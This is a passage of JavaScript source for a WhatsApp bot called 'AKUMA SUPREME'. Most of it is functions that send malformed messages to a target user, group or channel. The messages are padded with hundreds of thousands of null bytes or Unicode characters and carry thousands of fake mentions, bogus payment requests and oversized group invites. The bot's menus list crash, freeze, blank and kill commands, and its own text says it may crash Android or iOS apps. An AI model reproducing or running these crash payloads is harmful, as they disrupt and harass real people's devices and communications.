  await prim.relayMessage("status@broadcast", {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: { 
            text: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(522500)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: true,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "༑ Fail Beta - ( ×͜× 𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀 ×͜× ) \"👋\"",
              newsletterJid: "120363404493590395@newsletter",
              serverMessageId: 1
            },
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "©️ running since 2020 to 20##?",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: 'address_message',
                  paramsJson: "\u0000".repeat(522500),
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  }, {
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget }, content: [] }]
      }]
    }]
  });
}

async function ExperimentDelay2(prim, target, mention) {
  try {
    let sxo = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "galaxy_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await sleep(1000);

    let sXoMessage = {
      extendedTextMessage: {
        text: "ꦾ".repeat(300000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 850 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const xso = generateWAMessageFromContent(target, sXoMessage, {});

    await prim.relayMessage("status@broadcast", xso.message, {
      messageId: xso.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    if (mention) {
      await prim.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: xso.key.id,
              type: 25,
            },
          },
        },
      }, {});
    }

    await sleep(1000);

    await prim.relayMessage("status@broadcast", sxo.message, {
      messageId: sxo.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    if (mention) {
      await prim.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: sxo.key.id,
              type: 25,
            },
          },
        },
      }, {});
    }
  } catch (error) {
    console.error("Error in :", error, "Tai Mrk");
  }
}

//==============Functions andro2================
async function nullExc(target) {
  await prim.relayMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      requestFrom: target, 
      expiryTimestamp: null,
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterName: "7eppeli - Expos3d", 
          newsletterJid: "1@newsletter"
        }
      }
    }
  }, 
  { 
    participant: { jid:target }, 
    messageId: null
  })
}

async function nullExc2(target) {
  await prim.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: {
     jid:target
    }
  })
}

async function gsInt(target, zid = true) {
  for(let z = 0; z < 5; z++) {
    let ZxY = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`), 
          isForwarded: true, 
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363404493590395@newsletter", 
            newsletterName: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄", 
            serverMessageId: 1000,
            accessibilityText: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🐉˒"
          }, 
          statusAttributionType: "RESHARED_FROM_MENTION", 
          contactVcard: true, 
          isSampled: true, 
          dissapearingMode: {
            initiator: target, 
            initiatedByMe: true
          }, 
          expiration: Date.now()
        }, 
        body: {
          text: "🎭⃟༑⌁⃰𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄🐉",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"7eppeli.pdf\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    };
    
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: ZxY
      }
    }, {});
  
    await prim.relayMessage(target, msg.message, zid ? {
      messageId: msg.key.id,
      participant: { jid:target } 
    } : {
      messageId: msg.key.id
    });
  }
}

async function iosLx(target) {
const ZeppImg = fs.readFileSync('./bug.jpg');
  for(let z = 0; z < 720; z++) {
    await prim.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。🎭⃟༑⌁⃰𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄͡🐉` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/Dracula509",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: ZeppImg, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

//==============Functions ios================
async function ios1(isTarget) {
  const x = "𑇂𑆵𑆴𑆿".repeat(60000);
  const xx = "𑇂𑆵𑆴𑆿".repeat(10000);
  const xxx = `https://primis.xyz/${x}/${x}/${x}/${x}`;
  await prim.relayMessage(
    isTarget,
    {
      requestPhoneNumberMessage: {
        contextInfo: {
          quotedMessage: {
            locationMessage: {
              degreesLatitude: 21.1266,
              degreesLongitude: -11.8199,
              name:
                "💤‼️⃟⃰⃟꙰。𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄͜͡🐉" + x,
              merchantUrl: xxx,
              url: xxx
            }
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          mentionedJid: [
            isTarget,
            "13135550001@s.whatsapp.net",
            "13135550002@s.whatsapp.net",
          ],
          externalAdReply: {
            title: "💤‼️⃟⃰⃟꙰。𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🐉",
            body: xx + xx + xx,
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            sourceUrl: xxx,
            mediaUrl: xxx,
            merchantUrl: xxx,
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "1234567890@newsletter",
            serverMessageId: 1,
            newsletterName: xx,
            contentType: "UPDATE"
          }
        },
        skipType: 7
      }
    },
    {
      participant: { jid: isTarget }
    }
  );
}

async function ios2(isTarget) {
  const msg = generateWAMessageFromContent(
    isTarget,
    {
      extendedTextMessage: {
        text: "‼️".repeat(5000) + "💤".repeat(5000) + "𑇂𑆵𑆴𑆿".repeat(10000) + "⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(5000),
        contextInfo: {
          mentionedJid: [ 
            isTarget, 
            "support@s.whatsapp.net", 
            "13135550002@s.whatsapp.net"
          ],
          stanzaId: "X",
          participant: isTarget,
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: 999e+21 * 999e+21
            }
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {}
  );

  await prim.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id,
    participant: { jid: isTarget },
  });
}

async function trashios(isTarget) {
const executor = "𑇂𑆵𑆴𑆿𑆿".repeat(26000);
    let msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    jpegThumbnail: thumbnailX,
                    name: "🩸⃟༑⌁⃰𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🦠" + executor,
                    address: "༑ Fail Beta - ( ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜× ) \"👋\"" + executor,
                    url: `https://Primis.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + "𑇂𑆵𑆴𑆿"
                }
            }
        }
    }, {});
    
    await prim.relayMessage('status@broadcast', msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
                tag: 'mentioned_users',
                attrs: {},
                content: [{
                    tag: 'to',
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });
}

async function gsglx2(prim, target) {
    const msg = await generateWAMessageFromContent(target,{
        interactiveResponseMessage: {
          contextInfo: {},
          body: {
            text: " # ! ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜× ! ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          }
        }
      },
      {}
    );
    await prim.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
    participant: { jid: target }
  });
}

async function xStressKing(target, show = true) {
let push = [];

for (let r = 0; r < 1055; r++) {
push.push({
body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
header: proto.Message.InteractiveMessage.Header.fromObject({
title: " ",
hasMediaAttachment: true,
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
fileLength: "18352",
height: 720,
width: 1280,
mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
mediaKeyTimestamp: "1737281900",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
scanLengths: [3537, 10557, 1905, 2353],
midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
}
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: []
})
});
}

let msg1 = await generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
footer: proto.Message.InteractiveMessage.Footer.create({ text: "Dsprimis¿?" }),
header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [...push]
})
})
}
}
},
{}
);

let locationMessage = {
degreesLatitude: -9.09999262999,
degreesLongitude: 199.99963118999,
jpegThumbnail: null,
name: " Telegram: @Dracula509 " + "𑇂𑆵𑆴𑆿".repeat(15000),
address: "Telegram: @Dracula509" + "𖣂".repeat(5000),
url: `https://crazy.apple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
}
let msg2 = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
locationMessage
}
}
}, {});

for (const msg of [msg1, msg2]) {
await prim.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
}
]
}
]
});

if (show) {
await prim.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: msg.key, type: 25 } }
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "Telegram: @Dracula509" }
}
]
}
);
}
}
}

//==============Functions Group================
async function DocPay(isTarget, ptcp = false) {
    const msg = {
        interactiveMessage: {
            title: '🎭⃟༑𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🐉⃜' + "ꦾ".repeat(50000),
            nativeFlowMessage: {
                buttons: [
                    {
                        name: 'review_and_pay',
                        buttonParamsJson: "{\"currency\":\"XOF\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":999999999,\"offset\":100},\"reference_id\":\"PRIMIS CRASHED\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"descripiton\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-69d62566-4850-469a-b192-a6fd9f58cc14\",\"name\":null,\"amount\":{\"value\":999999999,\"offset\":100},\"quantity\":1}]},\"additional_note\":null,\"native_payment_methods\":[],\"share_payment_status\":false}"
                    }
                ]
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: true,
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                    interactiveResponseMessage: {
                        body: {
                            text: "©️ running since 2020 to 20##?",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: "\u0000".repeat(500000),
                            version: 3
                        }
                    }
                }
            }
        }
    };
    
    await prim.sendMessage(isTarget, msg, 
        ptcp ? { participant: { jid: isTarget } } : {});
}

async function InViteAdminA(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "ཹ".repeat(130000),
      groupJid: '6285709664923-1627579259@g.us',
      inviteCode: 'h+64P9RhJDzgXSPf',
      inviteExpiration: '999',
      caption: `🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ 𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
      thumbnail: null
    }
  };
  
  await prim.relayMessage(IsTarget, msg, 
  ptcp ? { participant: { jid: IsTarget } } : {}
  );
}
async function InViteAdminI(IsTarget, ptcp = false) {
  const msg = {
    groupInviteMessage: {
      groupName: "𑐶𑐵𑆷𑐷𑆵".repeat(39998),
      groupJid: '6285709664923-1627579259@g.us',
      inviteCode: 'h+64P9RhJDzgXSPf',
      inviteExpiration: '999',
      caption: `🧪⃟꙰⌁ ҈🩸⃟⃨〫⃰‣ ⁖𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🐉 ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ`,
      thumbnail: null
    }
  };
  
  await prim.relayMessage(IsTarget, msg, 
  ptcp ? { participant: { jid: IsTarget } } : {}
  );
}

//==============Functions Channel================
async function ForceNewsletter(target) {
  await prim.relayMessage(target, {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            participant: "131355550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            id: generateMessageTag()
          },
          type: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {})
  console.log("\x1b[34m[INFO]\x1b[0m Channel bugs have been sent to:", target);
}


        // -------------------- [ Main Command Switch ] --------------------
        const x = `${prefix + command}`
        switch (command) {

           case "prim": case "menu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`— ( 🦠 ) Hello ${user}. i'm ×͜× 𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄, created by ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×. this bot is designed for testing whatsapp stability and may cause the app to crash on Android or IOS devices.

> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                menureply(menu)
            }
            break
            
//==============Bug Menu================

            case "bug-menu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛

> ┏━━〔 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 〕━━┓
> ┃ ︻
> ┃ ➥ *.ᴅᴇʟᴀʏ-ᴠɪs*
> ┃ ➥ *.ᴅᴇʟᴀʏ-ɪɴᴠɪs*
> ┃ ➥ *.ʙʟᴀɴᴋ-ᴄʟɪᴄᴋ*
> ┃ ➥ *.ᴅᴇʟᴀʏ-ɪᴏs*
> ┃ ➥ *.ᴛʀᴀsʜ-ɪᴏs*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛

> ┏━━〔 𝐗𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 〕━━┓
> ┃ ︻
> ┃ ➥ *.xᴄʀᴀsʜ*
> ┃ ➥ *.xɢʀᴏᴜᴘ*
> ┃ ➥ *.xᴄʜᴀɴɴᴇʟ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break
            
            //==============Xgroup Menu================
            
                        case "xgroup": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛

> ┏━━〔 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 〕━━┓
> ┃ ︻
> ┃ ➥ *.ғᴄ-ɢc [ɪɴ ɢᴄ]*
> ┃ ➥ *.ᴄʀᴀᴄʜ-ɢc [ɪɴ ɢᴄ]*
> ┃ ➥ *.ʙʟᴀɴᴋ-ɢc [ɪɴ ɢᴄ]*
> ┃ ➥ *.ғʀᴇᴇᴢᴇ-ɢc [ɪɴ ɢᴄ]*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break
            
//==============Xchannel Menu================                                  
                               case "xchannel": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛

> ┏━━〔 𝐁𝐔𝐆 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 〕━━┓
> ┃ ︻
> ┃ ➥ *.ғᴄ-ᴄʜ [ɪɴ ᴄʜ]*
> ┃ ➥ *.ʙᴜɢ-ᴄʜ [ɪɴ ᴄʜ]*
> ┃ ➥ *.ᴋɪʟʟ-ᴄʜ [ɪɴ ᴄʜ]*
> ┃ ➥ *.ᴄʀᴀsʜ-ᴄʜ [ɪɴ ᴄʜ]*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break
            
//==============Other Menu================
            
            case "othermenu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
`
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛

> ┏━━〔 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔 〕━━┓
> ┃ ︻
> ┃ ➥ *.ᴀɪ*
> ┃ ➥ *.ɪᴅᴄʜ*
> ┃ ➥ *.ᴘɪɴɢ*
> ┃ ➥ *.ɪɴғᴏᴡᴀ*
> ┃ ➥ *.ᴀʙᴏᴜᴛ*
> ┃ ➥ *.ʏᴛsᴇᴀʀᴄʜ*
> ┃ ➥ *.ɪɴsᴛᴀɢʀᴀᴍ*
> ┃ ➥ *.ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ*
> ┃ ➥ *.ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
`;
                sreply(menu)
            }
            break
            
//==============Owner Menu================

            case "ownermenu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                const name = m.pushName || "No Name";
                const user = `${name}`;
                let menu =
 `               
> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
